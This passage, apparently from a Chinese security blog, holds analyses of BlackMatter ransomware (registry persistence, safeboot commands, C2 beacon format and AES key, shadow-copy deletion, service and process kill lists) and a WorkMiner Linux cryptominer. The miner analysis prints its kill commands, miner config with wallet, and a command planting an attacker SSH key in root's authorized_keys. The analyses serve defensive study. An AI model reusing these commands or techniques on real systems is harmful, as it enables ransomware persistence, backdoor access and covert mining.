<p>然后创建注册表：<code>SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon</code>，设置以下键值：</p>
<pre tabindex="0"><code>AutoAdminLogon:1
DefaultUserName:Administrator
DefaultDomainName:[GetComputerNameW()]
DefaultPassword:[Random_Password()]
</code></pre><p>整体结构如下：</p>
<p><img src="/blackmatter_images/4860455127509.png" alt=""></p>
<h4 id="632-runonce自启动">6.3.2. RunOnce自启动</h4>
<p>为了实现持久化，<code>BlackMatter</code>会随机生成一个9位数值名称：由3个随机大写字母、3个随机数字和3个随机小写字母组成，数值内容为当前路径，写入到注册表：<code>SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>中。</p>
<p><img src="/blackmatter_images/2350758120178.png" alt=""></p>
<h4 id="633-设置生成桌面壁纸">6.3.3. 设置生成桌面壁纸</h4>
<p>根据当前屏幕大小，修改注册表项中的<code>hScreen</code>和<code>wScreen</code>：</p>
<p><img src="/blackmatter_images/233209122487.png" alt=""></p>
<p>当操作系统是<code>windows 10</code>时，会在注册表<code>SOFTWARE\\Policies\\Microsoft\\Windows\\OOBE</code>中设置<code>DisablePrivacyExperience:1</code>：</p>
<p><img src="/blackmatter_images/524210140367.png" alt=""></p>
<p><!-- raw HTML omitted -->壁纸生成的具体细节如下：<!-- raw HTML omitted --></p>
<p>创建<code>Times New Roman</code>字体的句柄，从内存中获取壁纸突显的字符串：</p>
<pre tabindex="0"><code>BlackMatter Ransomware encrypted all your files!
To get your data back and keep your privacy safe,
you must find [readme.txt] file
and follow the instructions!
</code></pre><p><img src="/blackmatter_images/3314512137971.png" alt=""></p>
<p>然后以二进制形式将图片写入到<code>C:\ProgramData\[id].bmp</code>，从而生成壁纸文件：</p>
<p><img src="/blackmatter_images/3919418135473.png" alt=""></p>
<p>修改注册表<code>HKEY_CURRENT_USER\Control Panel\Desktop</code>的键值，设置桌面壁纸：</p>
<pre tabindex="0"><code>WallPaper:C:\ProgramData\[id].bmp
WallpaperStyle:10
</code></pre><p><img src="/blackmatter_images/992920116714.png" alt=""></p>
<h4 id="634-重启进入安全模式">6.3.4. 重启进入安全模式</h4>
<p><code>BlackMatter</code>会根据当前运行的操作系统版本，选择相应的命令使用<code>WinExec</code>执行，并重启操作系统。
当传递的参数为<code>True</code>时（从上方可以得知，当前模式传递的是<code>True</code>），启用安全模式：</p>
<pre tabindex="0"><code>winsows vista 之前的操作系统：bcdedit /set {{current}} safeboot network
winsows vista 之后的操作系统：bootcfg /raw /a /safeboot:network /id 1
</code></pre><p>当传递的参数为<code>False</code>时，该函数还提供了关闭功能：</p>
<pre tabindex="0"><code>winsows vista 之前的操作系统：bcdedit /deletevalue {{current}} safeboot
winsows vista 之后的操作系统：bootcfg /raw /fastdetect /id 1
</code></pre><p><img src="/blackmatter_images/1700123139154.png" alt=""></p>
<h3 id="64-壁纸模式">6.4. 壁纸模式</h3>
<p>当使用<code>-wall</code>参数时，<code>BlackMatter</code>仅生成壁纸，具体可参考<a href="#wallpaper">壁纸生成的具体细节</a>。</p>
<h3 id="65-默认模式">6.5. 默认模式</h3>
<p>当什么都不添加时，就进入到该模式，该模式涵盖了大多数的功能。</p>
<p><img src="/blackmatter_images/3815139134290.png" alt=""></p>
<h4 id="651-互斥锁">6.5.1. 互斥锁</h4>
<p>当<code>Mutex_Flag</code>为真时，将运行一次互斥。首先是获取<code>MachineGuid</code>，再通过<code>MD4</code>加密生成<code>hash</code>，再使用<code>OpenMutexW</code>结果来测试是否已存在。</p>
<p><img src="/blackmatter_images/3512845127836.png" alt=""></p>
<p>如果存在，则关闭并退出，如果不存在则创建并继续：</p>
<p><img src="/blackmatter_images/4118951120970.png" alt=""></p>
<h4 id="652-网络请求">6.5.2. 网络请求</h4>
<p>如果配置文件中的<code>Post_Flag</code>为真，则会收集数据并发送到<code>C2</code>服务器。</p>
<p>在加密前会进行一次基本信息的收集，数据结构的<code>json</code>格式如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="nt">&#34;bot_version&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="nt">&#34;bot_id&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="nt">&#34;bot_company&#34;</span><span class="p">:</span><span class="s2">&#34;%.8x%.8x%.8x%.8x%&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="nt">&#34;host_hostname&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="nt">&#34;host_user&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="nt">&#34;host_os&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="nt">&#34;host_domain&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="nt">&#34;host_arch&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="nt">&#34;host_lang&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="nt">&#34;disks_info&#34;</span><span class="p">:[</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>						<span class="c1">//当存在多个磁盘，该字典将变多
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>         <span class="nt">&#34;disk_name&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">         <span class="nt">&#34;disk_size&#34;</span><span class="p">:</span><span class="s2">&#34;%u&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">         <span class="nt">&#34;free_size&#34;</span><span class="p">:</span><span class="s2">&#34;%u&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">   <span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>以下是我在虚拟机中获取的加密前发送数据：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nt">&#34;bot_version&#34;</span><span class="p">:</span><span class="s2">&#34;1.2&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="nt">&#34;bot_id&#34;</span><span class="p">:</span><span class="s2">&#34;26a3ebea3de1f2c535eb81c5456fc830&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="nt">&#34;bot_company&#34;</span><span class="p">:</span><span class="s2">&#34;512478c08dada2af19e49808fbda5b0b&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="nt">&#34;host_hostname&#34;</span><span class="p">:</span><span class="s2">&#34;WIN-B1ESUN1R9U8&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="nt">&#34;host_user&#34;</span><span class="p">:</span><span class="s2">&#34;alee&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="nt">&#34;host_os&#34;</span><span class="p">:</span><span class="s2">&#34;Windows 7 Ultimate&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="nt">&#34;host_domain&#34;</span><span class="p">:</span><span class="s2">&#34;WORKGROUP&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="nt">&#34;host_arch&#34;</span><span class="p">:</span><span class="s2">&#34;x64&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="nt">&#34;host_lang&#34;</span><span class="p">:</span><span class="s2">&#34;zh-CN&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="nt">&#34;disks_info&#34;</span><span class="p">:[</span>
</span></span><span class="line"><span class="cl">		<span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nt">&#34;disk_name&#34;</span><span class="p">:</span><span class="s2">&#34;C&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="nt">&#34;disk_size&#34;</span><span class="p">:</span><span class="s2">&#34;102397&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="nt">&#34;free_size&#34;</span><span class="p">:</span><span class="s2">&#34;70005&#34;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>当加密完成以后，还会进行一次结果统计，数据结构的<code>json</code>格式如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nt">&#34;bot_version&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="nt">&#34;bot_id&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="nt">&#34;bot_company&#34;</span><span class="p">:</span><span class="s2">&#34;%.8x%.8x%.8x%.8x%&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="nt">&#34;stat_all_files&#34;</span><span class="p">:</span><span class="s2">&#34;%u&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="nt">&#34;stat_not_encrypted&#34;</span><span class="p">:</span><span class="s2">&#34;%u&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="nt">&#34;stat_size&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="nt">&#34;execution_time&#34;</span><span class="p">:</span><span class="s2">&#34;%u&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="nt">&#34;start_time&#34;</span><span class="p">:</span><span class="s2">&#34;%u&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="nt">&#34;stop_time&#34;</span><span class="p">:</span><span class="s2">&#34;%u&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>以下是我在虚拟机中获取的加密后发送数据</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nt">&#34;bot_version&#34;</span><span class="p">:</span><span class="s2">&#34;1.2&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="nt">&#34;bot_id&#34;</span><span class="p">:</span><span class="s2">&#34;26a3ebea3de1f2c535eb81c5456fc830&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="nt">&#34;bot_company&#34;</span><span class="p">:</span><span class="s2">&#34;512478c08dada2af19e49808fbda5b0b&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="nt">&#34;stat_all_files&#34;</span><span class="p">:</span><span class="s2">&#34;16499&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="nt">&#34;stat_not_encrypted&#34;</span><span class="p">:</span><span class="s2">&#34;3&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="nt">&#34;stat_size&#34;</span><span class="p">:</span><span class="s2">&#34;1282&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="nt">&#34;execution_time&#34;</span><span class="p">:</span><span class="s2">&#34;829&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="nt">&#34;start_time&#34;</span><span class="p">:</span><span class="s2">&#34;1633799826&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="nt">&#34;stop_time&#34;</span><span class="p">:</span><span class="s2">&#34;1633800656&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>获取到数据后，会通过<code>AES</code>加密，再通过<code>base64</code>编码：</p>
<p><img src="/blackmatter_images/4454242190921.png" alt=""></p>
<p><code>AES</code>加密的密钥为：<code>A6F330B09CD47B4FB9214F7836AA46AD</code></p>
<p><img src="/blackmatter_images/2348558197308.png" alt=""></p>
<p>最终的<code>C2</code>服务器为：<code>https[:]//paymenthacks.com</code></p>
<p><img src="/blackmatter_images/4878954196676.png" alt=""></p>
<h4 id="653-清除回收站数据">6.5.3. 清除回收站数据</h4>
<p>在加密前，会遍历每一个磁盘驱动器上的第一个<code>recycle</code>文件：</p>
<p><img src="/blackmatter_images/5382300124004.png" alt=""></p>
<p>然后删除所有<code>S-</code>开头的文件：</p>
<p><img src="/blackmatter_images/4865402132951.png" alt=""></p>
<h4 id="654-删除卷影副本">6.5.4. 删除卷影副本</h4>
<p>使用<code>CoCreateInstance</code>创建两个对象，然后使用<code>IWbemServices::ExecQuery</code>方法执行<code>WQL</code>查询<code>SELECT * FROM Win32_ShadowCopy</code>检索卷影副本对象：</p>
<p><img src="/blackmatter_images/5327813125836.png" alt=""></p>
<p>调用<code>IEnumWbemClassObject::Next</code>枚举系统上的所有卷影副本，调用<code>IEnumWbemClassObject::Get</code>获取每个卷影副本的 ID，并调用<code>IWbemServices::DeleteInstance</code>删除它们。</p>
<h4 id="655-终止服务">6.5.5. 终止服务</h4>
<p>当<code>Kill_Service_Flag</code>为<code>True</code>时，使用<code>OpenSCManagerW</code>获取服务控制管理器句柄，然后使用<code>EnumServicesStatusExW</code>枚举所有服务，对比是否在终止名单中，如果是，则使用<code>ControlService</code>发送控制代码，使用<code>DeleteService</code>删除服务，服务列表如下：</p>
<pre tabindex="0"><code>&#34;mepocs&#34;、&#34;memtas&#34;、&#34;veeam&#34;、&#34;svc$&#34;、&#34;backup&#34;、&#34;sql&#34;、&#34;vss&#34;
</code></pre><p><img src="/blackmatter_images/3309612136445.png" alt=""></p>
<h4 id="656-杀死进程">6.5.6. 杀死进程</h4>
<p>当<code>Kill_Process_Flag</code>为<code>True</code>时，使用<code>NtQuerySystemInformation</code>检索进程列表，对比是否在杀死名单中，如果是，使用<code>NtOpenProcess</code>确认句柄，使用<code>NtTerminateProcess</code>杀死进程，进程列表如下：</p>
<pre tabindex="0"><code>&#34;encsvc&#34;、&#34;thebat&#34;、&#34;mydesktopqos&#34;、&#34;xfssvccon&#34;、&#34;firefox&#34;、&#34;infopath&#34;、&#34;winword&#34;、&#34;steam&#34;、&#34;synctime&#34;、&#34;notepad&#34;、&#34;ocomm&#34;、&#34;onenote&#34;、&#34;mspub&#34;、&#34;thunderbird&#34;、&#34;agntsvc&#34;、&#34;sql&#34;、&#34;excel&#34;、&#34;powerpnt&#34;、&#34;outlook&#34;、&#34;wordpad&#34;、&#34;dbeng50&#34;、&#34;isqlplussvc&#34;、&#34;sqbcoreservice&#34;、&#34;oracle&#34;、&#34;ocautoupds&#34;、&#34;dbsnmp&#34;、&#34;msaccess&#34;、&#34;tbirdconfig&#34;、&#34;ocssd&#34;、&#34;mydesktopservice&#34;、&#34;visio&#34;
</code></pre><p><img src="/blackmatter_images/5616521163400.png" alt=""></p>
<h4 id="657-io多线程加密">6.5.7. I/O多线程加密</h4>
<p>创建用于处理<code>I/O</code>数据包的子线程，这些子线程使用<code>GetQueuedCompletionStatus</code>与<code>PostQueuedCompletionStatus</code>与主线程进行通信。接收到的数据包，都是需要处理的文件。</p>
<p><img src="/blackmatter_images/3954843145613.png" alt=""></p>
<p><strong>整个加密过程存在四个 case</strong></p>
<ol>
<li><code>case 0</code>：读取文件；</li>
</ol>
<p><img src="/blackmatter_images/1719746134911.png" alt=""></p>
<ol start="2">
<li><code>case 1</code>：加密和写入文件。加密采用了自定义的加密算法，待加密结束后，将文件重新写入磁盘；</li>
</ol>
<p><img src="/blackmatter_images/5614756143391.png" alt=""></p>
<p><img src="/blackmatter_images/3789249131162.png" alt=""></p>
<ol start="3">
<li><code>case 2</code>：写入文件页脚标识。当完成加密后，会在文件末端写入标识，标记该文件已被加密；</li>
</ol>
<p><img src="/blackmatter_images/485053131301.png" alt=""></p>
<ol start="4">
<li><code>case 3</code>：当加密完成并写入页脚后，调用<code>NtClose</code>关闭文件句柄，使用<code>RtlFreeHeap</code>释放缓冲区</li>
</ol>
<p><img src="/blackmatter_images/2986658148430.png" alt=""></p>
<h4 id="658-驱动器检索">6.5.8. 驱动器检索</h4>
<p>当<code>Drive_Flag</code>为<code>True</code>时，采用<code>FindFirstVolumeW</code>和<code>FindNextVolumeW</code>检索全部的卷，然后调用<code>GetVolumePathNamesForVolumeNameW</code>检索驱动器号和已安装文件夹路径的列表：</p>
<p><img src="/blackmatter_images/1439938191050.png" alt=""></p>
<p>当操作系统版本是<code>Windows 7</code>以前的版本时，将<code>bootmgr</code>挂载到最后一个驱动器后：</p>
<p><img src="/blackmatter_images/4987643209476.png" alt=""></p>
<h4 id="659-域内资源检索">6.5.9. 域内资源检索</h4>
<p>当<code>Network_Flag</code>为<code>True</code>时，将通过<code>DsGetDcNameW</code>获取域控制器信息，然后使用<code>DsGetDcOpenW</code>打开控制器，通过<code>DsGetDcNextW</code>枚举出所有的域控制器：</p>
<p><img src="/blackmatter_images/4952449217509.png" alt=""></p>
<p>然后采用<code>ADsEnumerateNext</code>来枚举域控制器内的<code>DNS</code>主机：</p>
<p><img src="/blackmatter_images/2959658206733.png" alt=""></p>
<p>然后使用<code>NetShareEnum</code>多线程寻找域内主机：</p>
<p><img src="/blackmatter_images/2985801230367.png" alt=""></p>
<p>剩下的就是目录过滤和加密了：</p>
<p><img src="/blackmatter_images/2315602227971.png" alt=""></p>
<h4 id="6510-检索文件并加密">6.5.10. 检索文件并加密</h4>
<p>当<code>Drive_Flag</code>为<code>True</code>时，使用<code>FindFirstVolumeW</code>和<code>FindNextVolumeW</code>获取所有卷的驱动器号和已安装文件夹路径的列表；扫描每个驱动器目录，在目录中放置赎金票据，并使用<code>FindFirstFileExW</code>和<code>FindNextFileW</code>枚举目录，避开所有名为<code>.</code>或<code>..</code>的文件或目录：</p>
<p><img src="/blackmatter_images/4150840180904.png" alt=""></p>
<p>在对文件进行加密时，首先会解除服务或进程对文件的占用：</p>
<p><img src="/blackmatter_images/5094041166456.png" alt=""></p>
<p>然后会检查文件是否已加密：</p>
<p><img src="/blackmatter_images/1359646182735.png" alt=""></p>
<p>将文件更名为带加密拓展名的文件：</p>
<p><img src="/blackmatter_images/3419454175780.png" alt=""></p>
<p>然后使用<code>CreateIoCompletionPort</code>向全局<code>I/O</code>注册文件句柄，让<code>I/O</code>子线程进行加密：</p>
<p><img src="/blackmatter_images/1081156172547.png" alt=""></p>
<p><strong>参考链接</strong></p>
<pre tabindex="0"><code>RID 说明：https://docs.microsoft.com/zh-tw/dotnet/api/system.security.principal.windowsprincipal.isinrole?redirectedfrom=MSDN&amp;view=windowsdesktop-5.0#overloads
OSMajorVersion 与 OSMinorVersion 对照表：https://docs.microsoft.com/en-us/windows-hardware/drivers/install/inf-manufacturer-section
样本配置文件提取器：https://github.com/advanced-threat-research/DarkSide-Config-Extract
</code></pre>]]></content>
		</item>
		
		<item>
			<title>WorkMiner</title>
			<link>https://www.a1ee.cn/medium/workminer/</link>
			<pubDate>Wed, 01 Sep 2021 08:59:16 +0800</pubDate>
			
			<guid>https://www.a1ee.cn/medium/workminer/</guid>
			<description>WorkMiner样本分析 样本信息 使用DIE查看样本情况： 脱壳 使用upx3.93脱壳失败，提示： upx: work64: CantUnpackException: p_info corrupted 使用文本标记其查看二进制文件，发现</description>
			<content type="html"><![CDATA[<h1 id="workminer样本分析">WorkMiner样本分析</h1>
<h2 id="样本信息">样本信息</h2>
<p>使用<code>DIE</code>查看样本情况：</p>
<p><img src="/workminer_images/2436651160000.png" alt=""></p>
<h2 id="脱壳">脱壳</h2>
<p>使用<code>upx3.93</code>脱壳失败，提示：</p>
<pre tabindex="0"><code>upx: work64: CantUnpackException: p_info corrupted
</code></pre><p>使用文本标记其查看二进制文件，发现<code>p_info</code>被修改了：</p>
<p><img src="/workminer_images/2446734175295.png" alt=""></p>
<p>从末尾找到文件大小：</p>
<p><img src="/workminer_images/1805533162309.png" alt=""></p>
<p>修复<code>p_info</code>即可成功脱壳：</p>
<p><img src="/workminer_images/367734177793.png" alt=""></p>
<h2 id="去除混淆">去除混淆</h2>
<p>脱壳后，使用<code>IDA</code>加载，查找字符串，发现是<code>golang</code>程序：</p>
<p><img src="/workminer_images/5157232166555.png" alt=""></p>
<p>使用<code>IDAGolangHelper</code>解除混淆可正常分析。</p>
<h2 id="功能分析">功能分析</h2>
<h3 id="main_killminer">main_killminer</h3>
<p>执行命令终止其他挖矿进程</p>
<p><img src="/workminer_images/980700198976.png" alt=""></p>
<p>命令列表如下：</p>
<pre tabindex="0"><code>ps -ef | grep ddg | grep -v grep | awk &#39;{print $2}&#39; | xargs kill -9
ps -ef | grep xmr | grep -v grep | awk &#39;{print $2}&#39; | xargs kill -9
ps -ef | grep tcp: | grep -v grep | awk &#39;{print $2}&#39; | xargs kill -9
ps -ef | grep x86_ | grep -v grep | awk &#39;{print $2}&#39; | xargs kill -9
ps -ef | grep miner | grep -v grep | awk &#39;{print $2}&#39; | xargs kill -9
ps -ef | grep pool. | grep -v grep | awk &#39;{print $2}&#39; | xargs kill -9
ps -ef | grep monero | grep -v grep | awk &#39;{print $2}&#39; | xargs kill -9
ps -ef | grep prohash | grep -v grep | awk &#39;{print $2}&#39; | xargs kill -9
ps -ef | grep stratum | grep -v grep | awk &#39;{print $2}&#39; | xargs kill -9
ps -ef | grep .daemond | grep -v grep | awk &#39;{print $2}&#39; | xargs kill -9
ps -ef | grep Circle_MI | grep -v grep | awk &#39;{print $2}&#39; | xargs kill -9
ps -ef | grep kworker34 | grep -v grep | awk &#39;{print $2}&#39; | xargs kill -9
ps -ef | grep cryptonight | grep -v grep | awk &#39;{print $2}&#39; | xargs kill -9
ps -ef | grep /tmp/thisxxs | grep -v grep | awk &#39;{print $2}&#39; | xargs kill -9
ps -ef | grep /usr/bin/.sshd | grep -v grep | awk &#39;{print $2}&#39; | xargs kill -9
ps -ef | grep /opt/yilu/mservice | grep -v grep | awk &#39;{print $2}&#39; | xargs kill -9
ps -ef | grep /opt/yilu/work/xig/xig | grep -v grep | awk &#39;{print $2}&#39; | xargs kill -9
ps -ef | grep /usr/bin/bsd-port/getty | grep -v grep | awk &#39;{print $2}&#39; | xargs kill -9
</code></pre><h3 id="文件释放">文件释放</h3>
<p>检查是否存在环境变量<code>TMPDIR</code>，切换到<code>/tmp</code>目录下执行<code>killall xmr</code>命令，将系统命令：<code>wget</code>改为<code>wget1</code>、<code>curl</code>改为<code>curl1</code>：</p>
<p><img src="/workminer_images/3871249213222.png" alt=""></p>
<p>生成配置文件：<code>/tmp/config.json</code></p>
<p><img src="/workminer_images/4658020187658.png" alt=""></p>
<p>配置文件内容如下（其中包含了挖矿钱包）：</p>
<pre tabindex="0"><code>{
	&#34;api&#34;: {
		&#34;id&#34;: null,
		&#34;worker-id&#34;: null
	},
	&#34;http&#34;: {
		&#34;enabled&#34;: false,
		&#34;host&#34;: &#34;127001&#34;,
		&#34;port&#34;: 0,
		&#34;access-token&#34;: null,
		&#34;restricted&#34;: true
	},
	&#34;autosave&#34;: true,
	&#34;background&#34;: true,
	&#34;colors&#34;: true,
	&#34;title&#34;: true,
	&#34;randomx&#34;: {
		&#34;init&#34;: -1,
		&#34;mode&#34;: &#34;auto&#34;,
		&#34;1gb-pages&#34;: false,
		&#34;rdmsr&#34;: true,
		&#34;wrmsr&#34;: false,
		&#34;numa&#34;: true
	},
	&#34;cpu&#34;: {
		&#34;enabled&#34;: true,
		&#34;huge-pages&#34;: true,
		&#34;hw-aes&#34;: null,
		&#34;priority&#34;: null,
		&#34;memory-pool&#34;: false,
		&#34;yield&#34;: true,
		&#34;argon2-impl&#34;: null,
		&#34;astrobwt-max-size&#34;: 550,
		&#34;astrobwt-avx2&#34;: false,
		&#34;argon2&#34;: [0],
		&#34;astrobwt&#34;: [-1],
		&#34;cn&#34;: [
			[1, 0]
		],
		&#34;rx&#34;: [0],
		&#34;rx/wow&#34;: [0],
		&#34;cn/0&#34;: false,
		&#34;rx/arq&#34;: &#34;rx/wow&#34;,
		&#34;rx/keva&#34;: &#34;rx/wow&#34;
	},
	&#34;donate-level&#34;: 0,
	&#34;donate-over-proxy&#34;: 1,
	&#34;log-file&#34;: null,
	&#34;pools&#34;: [{
		&#34;algo&#34;: null,
		&#34;coin&#34;: null,
		&#34;url&#34;: &#34;xmrcrypto-poolfr:6666&#34;,
		&#34;user&#34;: &#34;47BD6QNfkWf8ZMQSdqp2tY1AdG8ofsEPf4mcDp1YB4AX32hUjoLjuDaNrYzXk7cQcoPBzAuQrmQTgNgpo6XPqSBLCnfsjaV&#34;,
		&#34;pass&#34;: &#34;x&#34;,
		&#34;rig-id&#34;: null,
		&#34;nicehash&#34;: false,
		&#34;keepalive&#34;: false,
		&#34;enabled&#34;: true,
		&#34;tls&#34;: false,
		&#34;tls-fingerprint&#34;: null,
		&#34;daemon&#34;: false,
		&#34;socks5&#34;: null,
		&#34;self-select&#34;: null
	}],
	&#34;print-time&#34;: 60,
	&#34;retries&#34;: 5,
	&#34;retry-pause&#34;: 5,
	&#34;syslog&#34;: false,
	&#34;user-agent&#34;: null,
	&#34;verbose&#34;: 0,
	&#34;watch&#34;: true
}
</code></pre><p>将<code>elf</code>格式的二进制文件写入到<code>/tmp/xmr</code>中：</p>
<p><img src="/workminer_images/2204351171322.png" alt=""></p>
<p>添加可执行权限：</p>
<p><img src="/workminer_images/2258155195435.png" alt=""></p>
<p>生成<code>/tmp/secure.sh</code>脚本并添加可执行权限：</p>
<p><img src="/workminer_images/5877555184733.png" alt=""></p>
<p>脚本内容如下：</p>
<pre tabindex="0"><code>#!/bin/bash

LIMIT=8
while true ; do
    TIME=$(date &#39;+%b %e %H&#39;)     #example: Apr 11 11
    BLOCK_IP=$(grep &#34;$TIME&#34; /var/log/secure|grep Failed|awk &#39;{print $(NF-3)}&#39;|sort|uniq -c|awk &#39;$1&gt;&#34;$LIMIT&#34;{print $1&#34;:&#34;$2}&#39;)
    for i in $BLOCK_IP
    do
        IP=$(echo $i|awk -F: &#39;{print $2}&#39;)
        grep $IP /etc/hosts.deny &gt; /dev/null
        if [ $? -gt 0 ];
        then
            echo &#34;sshd:$IP&#34; &gt;&gt; /etc/hosts.deny
        fi
    done
    sleep 60
done
</code></pre><p>生成<code>/tmp/auth.sh</code>脚本并添加可执行权限：</p>
<p><img src="/workminer_images/141357180984.png" alt=""></p>
<p>脚本内容如下：</p>
<pre tabindex="0"><code>#!/bin/bash

LIMIT=8
while true ; do
    TIME=$(date &#39;+%b %e %H&#39;)     #example: Apr 11 11
    BLOCK_IP=$(grep &#34;$TIME&#34; /var/log/auth.log|grep Failed|awk &#39;{print $(NF-3)}&#39;|sort|uniq -c|awk &#39;$1&gt;&#34;$LIMIT&#34;{print $1&#34;:&#34;$2}&#39;)
    for i in $BLOCK_IP
    do
        IP=$(echo $i|awk -F: &#39;{print $2}&#39;)
        grep $IP /etc/hosts.deny &gt; /dev/null
        if [ $? -gt 0 ];
        then
            echo &#34;sshd:$IP&#34; &gt;&gt; /etc/hosts.deny
        fi
    done
    sleep 60
done
</code></pre><p>检查是否存在<code>/usr/.work</code>，不存在则创建：</p>
<p><img src="/workminer_images/5425616185658.png" alt=""></p>
<p>将当前路径（<code>/tmp</code>）下的文件拷贝到<code>/usr/.work</code>中去</p>
<p><img src="/workminer_images/2576720186267.png" alt=""></p>
<h3 id="main_add_crontab_job">main_add_crontab_job</h3>
<p>检查是否存在<code>/root/.ssh</code>，不存在则创建，然后设置权限为<code>700</code>：</p>
<p><img src="/workminer_images/3347128191123.png" alt=""></p>
<p>生成<code>/root/.ssh/authorized_keys</code>，设置权限为<code>600</code>，并使用<code>echo</code>写入内容：</p>
<p><img src="/workminer_images/5574831203213.png" alt=""></p>
<p>写入公钥命令为：</p>
<pre tabindex="0"><code>echo &#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDc3BlbiQaznPT8TScrs9YIzmrpI9Lpa4LtCjB5z0LuQ4o6XwvzomxAixn2F1jaUl175Cxcg3PmUsPOLE+WeWicKqL2YZ46SotjZgnS6JjXpuZVi7V0DSiXu0itlwWDC9m8huBvUBSIsDCsgb9OeG6rlrCyZgTW+qZciK+KZ8rwlFp3CFyxoF2122ueOnl5pAUCy1iHqGun03dMdUxA1d3KnxSZ3NQrYiH69dc8/YhV4SriOW9psc0pv9KeBLF0OXHtEAdbnSlwfk2uTjjBMK0nDidl7wS52Ygi/H4+P+4EXkSzf4Jj4/L6P3c5rLC3/l3RFdo1T7EQ8fH6NsTYJNZ7 root@u911&#34; &gt;&gt; /root/.ssh/authorized_keys
</code></pre><p>检测是否存在以下文件：</p>
<pre tabindex="0"><code>/etc/rc.d/rc.local
/etc/rc.local
/etc/rc.conf
/etc/crontab
</code></pre><p><img src="/workminer_images/1157936208252.png" alt=""></p>
<p>检测是否存在以下文件：</p>
<pre tabindex="0"><code>/var/spool/cron/root
/var/spool/cron/crontabs
</code></pre><p><img src="/workminer_images/1021943209547.png" alt=""></p>
<p>附加文件：</p>
<pre tabindex="0"><code>/var/spool/cron/root
/var/spool/cron/crontabs/root
</code></pre><p><img src="/workminer_images/4794654210549.png" alt=""></p>
